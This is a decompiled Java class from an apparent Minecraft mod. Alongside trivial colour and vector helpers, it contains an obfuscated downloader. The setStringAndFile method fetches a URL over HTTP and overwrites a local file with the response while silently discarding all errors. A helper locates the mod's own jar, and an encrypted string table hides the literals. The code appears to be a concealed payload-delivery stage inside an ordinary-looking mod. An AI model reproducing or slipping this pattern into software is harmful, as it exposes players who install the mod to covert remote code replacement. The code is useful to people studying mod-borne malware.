// 
// Decompiled by Procyon v0.6.0
// 

package com.target.mod.compat.sub1.sub2.sub7;

import net.minecraft.class_243;
import org.joml.Vector3d;
import java.io.InputStream;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;
import java.nio.file.CopyOption;
import java.net.URI;
import java.net.HttpURLConnection;
import java.net.URISyntaxException;
import java.io.File;
import java.awt.Color;

public final class Initializer_2
{
    private static final String[] strArr;
    private static final String[] strArr_1;
    
    public static Color createColor(final int n, final int n2) {
        final int intValue = Initializer_16.intValue;
        final int intValue_1 = Initializer_16.intValue_1;
        final int intValue_2 = Initializer_16.intValue_2;
        if (Initializer_16.boolFlag) {
            return Initializer_7.createColor(n2, n);
        }
        return Initializer_16.boolFlag_1 ? Initializer_7.createColor_1(new Color(intValue, intValue_1, intValue_2, n), n2, 20) : new Color(intValue, intValue_1, intValue_2, n);
    }
    
    public static File getFile() throws URISyntaxException {
        return new File(Initializer_2.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath());
    }
    
    public static void setStringAndFile(final String str, final File file) {
        final int int_1 = Initializer_14.getInt_1();
        try {
            final HttpURLConnection httpURLConnection = (HttpURLConnection)URI.create(str).toURL().openConnection();
            httpURLConnection.setRequestMethod(createString(12356, 30382));
            final InputStream inputStream = httpURLConnection.getInputStream();
            try {
                Files.copy(inputStream, file.toPath(), StandardCopyOption.REPLACE_EXISTING);
                if (int_1 == 0) {
                    return;
                }
                try {
                    if (inputStream != null) {
                        inputStream.close();
                    }
                }
                catch (final Throwable t) {
                    throw computeThrowable(t);
                }
            }
            catch (final Throwable t2) {
                InputStream inputStream2;
                try {
                    inputStream2 = inputStream;
                    if (int_1 != 0) {
                        if (inputStream2 == null) {
                            throw t2;
                        }
                    }
                }
                catch (final Throwable t3) {
                    throw computeThrowable(t3);
                }
                try {
                    inputStream2.close();
                }
                catch (final Throwable exception) {
                    t2.addSuppressed(exception);
                }
                throw t2;
            }
            httpURLConnection.disconnect();
        }
        catch (final Throwable t4) {}
    }
    
    public static void setVector3dAndClass_243(final Vector3d vector3d, final class_243 class_243) {
        vector3d.x = class_243.field_1352;
        vector3d.y = class_243.field_1351;
        vector3d.z = class_243.field_1350;
    }
    
    public static float getFloat() {
        return 1.0f;
    }
    
    private static Throwable computeThrowable(final Throwable t) {
        return t;
    }
    
    static {
        final String[] strArr2 = new String[11];
        int n = 0;
        String s;
        int n2 = (s = "rR%E_\u001a\u009b\u0084M4X@\u0012\u00f6g£\u009d\u00c8\u0083+\u0005¬\u00ad_\u00de§\u0005\u00adg\u00ef]w\f-|\u00ce\u0080\"¥>\u00ce\u00d3L\u00e0W\u0002\n\u00f9\u0014\u00fd¹\u00d48aµ\\qµ\u008aG\u0097\u00f1\f\u001b\u00fc\u0012#rV\u00100¹\u0001\u0006Z\u00d4\u009aL\u0084&\u0099\u0004l\u00cdh9\t}¯\u00e9\u00c7\\\u0093\u0019\r\u0094\u0003\t\u00f9\u00e0").length();
        int n3 = 20;
        int n4 = -1;
    Label_0023:
        while (true) {
            while (true) {
                int n8;
                int n7;
                int n6;
                int n5 = n6 = (n7 = (n8 = 58));
                ++n4;
                final String s2 = s;
                final int beginIndex = n4;
                String s3 = s2.substring(beginIndex, beginIndex + n3);
                int n9 = -1;
                while (true) {
                    final char[] charArray = s3.toCharArray();
                    final int length = charArray.length;
                    int n10 = 0;
                    while (true) {
                        Label_0260: {
                            if (length > 1) {
                                break Label_0260;
                            }
                            n7 = (n6 = n10);
                            do {
                                final char c = charArray[n6];
                                charArray[n7] = (char)(c ^ (n5 ^ switch (n10 % 7) {
                                    case 0 -> 113;
                                    case 1 -> 75;
                                    case 2 -> 105;
                                    case 3 -> 55;
                                    case 4 -> 61;
                                    case 5 -> 13;
                                    default -> 46;
                                }));
                                ++n10;
                            } while (n8 == 0);
                        }
                        if (length > n10) {
                            continue;
                        }
                        break;
                    }
                    final String intern = new String(charArray).intern();
                    switch (n9) {
                        default: {
                            strArr2[n++] = intern;
                            if ((n4 += n3) < n2) {
                                n3 = s.charAt(n4);
                                continue Label_0023;
                            }
                            n2 = (s = "\u00f1\u0003c\u0097\u00e5\u00d2\u00d7[\u0085\u0082\u001f,\u0004\u00d1\u00d9+\u00c8").length();
                            n3 = 12;
                            n4 = -1;
                            break;
                        }
                        case 0: {
                            strArr2[n++] = intern;
                            if ((n4 += n3) < n2) {
                                n3 = s.charAt(n4);
                                break;
                            }
                            break Label_0023;
                        }
                    }
                    n5 = (n6 = (n7 = (n8 = 113)));
                    ++n4;
                    final String s4 = s;
                    final int beginIndex2 = n4;
                    s3 = s4.substring(beginIndex2, beginIndex2 + n3);
                    n9 = 0;
                }
            }
            break;
        }
        strArr = strArr2;
        strArr_1 = new String[11];
    }
    
    private static String createString(final int n, final int n2) {
        final int n3 = (n ^ 0x304C) & 0xFFFF;
        if (Initializer_2.strArr_1[n3] == null) {
            final char[] charArray = Initializer_2.strArr[n3].toCharArray();
            final int n5 = switch (charArray[0] & '\u00ff') {
                case 0 -> 177;
                case 1 -> 221;
                case 2 -> 157;
                case 3 -> 68;
                case 4 -> 137;
                case 5 -> 102;
                case 6 -> 51;
                case 7 -> 94;
                case 8 -> 246;
                case 9 -> 243;
                case 10 -> 255;
                case 11 -> 167;
                case 12 -> 206;
                case 13 -> 207;
                case 14 -> 141;
                case 15 -> 142;
                case 16 -> 127;
                case 17 -> 46;
                case 18 -> 77;
                case 19 -> 116;
                case 20 -> 50;
                case 21 -> 219;
                case 22 -> 75;
                case 23 -> 156;
                case 24 -> 9;
                case 25 -> 208;
                case 26 -> 110;
                case 27 -> 230;
                case 28 -> 17;
                case 29 -> 168;
                case 30 -> 187;
                case 31 -> 226;
                case 32 -> 20;
                case 33 -> 86;
                case 34 -> 11;
                case 35 -> 118;
                case 36 -> 247;
                case 37 -> 84;
                case 38 -> 19;
                case 39 -> 198;
                case 40 -> 165;
                case 41 -> 123;
                case 42 -> 147;
                case 43 -> 13;
                case 44 -> 228;
                case 45 -> 174;
                case 46 -> 229;
                case 47 -> 213;
                case 48 -> 184;
                case 49 -> 149;
                case 50 -> 182;
                case 51 -> 175;
                case 52 -> 231;
                case 53 -> 171;
                case 54 -> 31;
                case 55 -> 201;
                case 56 -> 241;
                case 57 -> 5;
                case 58 -> 202;
                case 59 -> 135;
                case 60 -> 173;
                case 61 -> 218;
                case 62 -> 139;
                case 63 -> 248;
                case 64 -> 178;
                case 65 -> 67;
                case 66 -> 169;
                case 67 -> 76;
                case 68 -> 92;
                case 69 -> 97;
                case 70 -> 180;
                case 71 -> 235;
                case 72 -> 237;
                case 73 -> 22;
                case 74 -> 145;
                case 75 -> 100;
                case 76 -> 83;
                case 77 -> 81;
                case 78 -> 103;
                case 79 -> 109;
                case 80 -> 111;
                case 81 -> 176;
                case 82 -> 80;
                case 83 -> 15;
                case 84 -> 194;
                case 85 -> 224;
                case 86 -> 192;
                case 87 -> 151;
                case 88 -> 199;
                case 89 -> 245;
                case 90 -> 140;
                case 91 -> 60;
                case 92 -> 55;
                case 93 -> 233;
                case 94 -> 166;
                case 95 -> 71;
                case 96 -> 211;
                case 97 -> 72;
                case 98 -> 10;
                case 99 -> 251;
                case 100 -> 163;
                case 101 -> 134;
                case 102 -> 191;
                case 103 -> 0;
                case 104 -> 225;
                case 105 -> 69;
                case 106 -> 36;
                case 107 -> 115;
                case 108 -> 40;
                case 109 -> 8;
                case 110 -> 66;
                case 111 -> 138;
                case 112 -> 62;
                case 113 -> 74;
                case 114 -> 217;
                case 115 -> 82;
                case 116 -> 204;
                case 117 -> 215;
                case 118 -> 223;
                case 119 -> 126;
                case 120 -> 58;
                case 121 -> 1;
                case 122 -> 114;
                case 123 -> 195;
                case 124 -> 183;
                case 125 -> 24;
                case 126 -> 160;
                case 127 -> 124;
                case 128 -> 54;
                case 129 -> 254;
                case 130 -> 105;
                case 131 -> 63;
                case 132 -> 57;
                case 133 -> 119;
                case 134 -> 64;
                case 135 -> 32;
                case 136 -> 239;
                case 137 -> 47;
                case 138 -> 216;
                case 139 -> 2;
                case 140 -> 179;
                case 141 -> 136;
                case 142 -> 3;
                case 143 -> 212;
                case 144 -> 193;
                case 145 -> 244;
                case 146 -> 27;
                case 147 -> 93;
                case 148 -> 88;
                case 149 -> 85;
                case 150 -> 23;
                case 151 -> 122;
                case 152 -> 162;
                case 153 -> 28;
                case 154 -> 61;
                case 155 -> 188;
                case 156 -> 222;
                case 157 -> 48;
                case 158 -> 197;
                case 159 -> 30;
                case 160 -> 79;
                case 161 -> 43;
                case 162 -> 7;
                case 163 -> 12;
                case 164 -> 21;
                case 165 -> 18;
                case 166 -> 113;
                case 167 -> 181;
                case 168 -> 99;
                case 169 -> 128;
                case 170 -> 107;
                case 171 -> 70;
                case 172 -> 16;
                case 173 -> 250;
                case 174 -> 90;
                case 175 -> 117;
                case 176 -> 196;
                case 177 -> 38;
                case 178 -> 220;
                case 179 -> 210;
                case 180 -> 232;
                case 181 -> 214;
                case 182 -> 37;
                case 183 -> 172;
                case 184 -> 227;
                case 185 -> 87;
                case 186 -> 41;
                case 187 -> 154;
                case 188 -> 52;
                case 189 -> 33;
                case 190 -> 125;
                case 191 -> 121;
                case 192 -> 53;
                case 193 -> 120;
                case 194 -> 101;
                case 195 -> 98;
                case 196 -> 4;
                case 197 -> 130;
                case 198 -> 133;
                case 199 -> 132;
                case 200 -> 155;
                case 201 -> 129;
                case 202 -> 39;
                case 203 -> 242;
                case 204 -> 89;
                case 205 -> 252;
                case 206 -> 96;
                case 207 -> 236;
                case 208 -> 26;
                case 209 -> 29;
                case 210 -> 14;
                case 211 -> 146;
                case 212 -> 104;
                case 213 -> 95;
                case 214 -> 106;
                case 215 -> 45;
                case 216 -> 56;
                case 217 -> 152;
                case 218 -> 34;
                case 219 -> 158;
                case 220 -> 65;
                case 221 -> 25;
                case 222 -> 73;
                case 223 -> 59;
                case 224 -> 148;
                case 225 -> 189;
                case 226 -> 164;
                case 227 -> 161;
                case 228 -> 240;
                case 229 -> 200;
                case 230 -> 234;
                case 231 -> 209;
                case 232 -> 249;
                case 233 -> 143;
                case 234 -> 186;
                case 235 -> 35;
                case 236 -> 78;
                case 237 -> 91;
                case 238 -> 44;
                case 239 -> 144;
                case 240 -> 49;
                case 241 -> 112;
                case 242 -> 170;
                case 243 -> 205;
                case 244 -> 153;
                case 245 -> 190;
                case 246 -> 238;
                case 247 -> 185;
                case 248 -> 159;
                case 249 -> 150;
                case 250 -> 6;
                case 251 -> 253;
                case 252 -> 203;
                case 253 -> 108;
                case 254 -> 42;
                default -> 131;
            };
            int n6 = (n2 & 0xFF) - n5;
            if (n6 < '\0') {
                n6 += '\u0100';
            }
            int n7 = ((n2 & 0xFFFF) >>> 8) - n5;
            if (n7 < '\0') {
                n7 += '\u0100';
            }
            for (int i = 0; i < charArray.length; ++i) {
                final int n8 = i % 2;
                final char[] array = charArray;
                final int n9 = i;
                final char c = array[n9];
                if (n8 == 0) {
                    array[n9] = (char)(c ^ n6);
                    n6 = (((n6 >>> 3 | n6 << 5) ^ charArray[i]) & 0xFF);
                }
                else {
                    array[n9] = (char)(c ^ n7);
                    n7 = (((n7 >>> 3 | n7 << 5) ^ charArray[i]) & 0xFF);
                }
            }
            Initializer_2.strArr_1[n3] = new String(charArray).intern();
        }
        return Initializer_2.strArr_1[n3];
    }
}
